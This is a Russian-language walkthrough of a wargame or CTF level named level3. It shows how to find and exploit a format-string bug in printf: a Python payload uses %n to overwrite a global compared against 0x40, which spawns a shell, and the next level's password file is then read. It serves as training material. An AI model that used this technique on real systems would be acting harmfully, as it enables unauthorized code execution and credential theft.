смотрим, где мы оказались и что у нас есть
    ls
    level3

при вызове скрипта, можно вывести значения из стэка
    ./level3
    %d %x %p
с помощью ltrace посмотрим используемые функции,
в данном случае используется fgets.а это уже защищенная функция
также используется printf

посмотрим внутрь файла с помощью gdb
в функции main вызывается функция v, глянем ее
    ...
    0x80484d5 <v+49>:	call   0x8048390 <printf@plt>
    0x80484da <v+54>:	mov    eax,ds:0x804988c
    0x80484df <v+59>:	cmp    eax,0x40
    ...

в данном месте происходит сравнение переменной по адресу 0x804988c с 0x40, в случае успеха откроется sh
найдем, в каком месте нужное нам место:
    python -c "print '\x8c\x98\x04\x08 %x %x %x %x %x %xs'" > /tmp/level3
    cat /tmp/level3 | ./level3
    � 200 b7fd1ac0 b7ff37d0 804988c

с помощью модификатора printf %n можно заменить значение переменной по адресу
    python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" > /tmp/level3
    cat /tmp/level3 - | ./level3
    cat /home/user/level4/.pass